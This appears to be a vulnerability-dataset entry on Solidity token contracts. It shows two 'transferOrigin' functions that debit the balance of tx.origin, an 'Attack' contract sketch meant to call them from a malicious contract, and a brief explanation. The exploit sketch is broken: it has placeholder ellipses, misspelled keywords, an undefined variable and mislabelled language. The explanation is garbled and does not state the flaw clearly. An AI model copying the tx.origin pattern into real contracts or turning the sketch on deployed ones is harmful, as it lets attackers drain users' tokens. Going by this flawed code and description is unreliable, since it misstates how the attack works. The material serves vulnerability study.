## Vulnerable Code

```javascript
**Instance_1**
function transferOrigin(address _to, uint256 _value) public returns (bool) {
    require(!locked);
    require(_to != address(0));
    require(msg.sender == impl);
    require(_value <= balances[tx.origin]);  //Vulnerable position

    // SafeMath.sub will throw if there is not enough balance.
    balances[tx.origin] = balances[tx.origin].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(tx.origin, _to, _value);
    return true;
  }


**Instance_2**
function transferOrigin(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0)); //code different
    require(_value <= balances[tx.origin]);

    balances[tx.origin] = balances[tx.origin].sub(_value);
    balances[_to] = balances[_to].add(_value);

    emit Transfer(tx.origin, _to, _value);

    return true;
}//out12448
```



## Exploit Code

```javascript
Contract Attack{
    address victim;
    function setVictimAddress(address _address){
        victim = _address;
    }
    function startAttack(){
        victimAddress.call(byte4(keccak256(“transferOrigin(address, uint256)”)), ..., ... );
        ...
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter
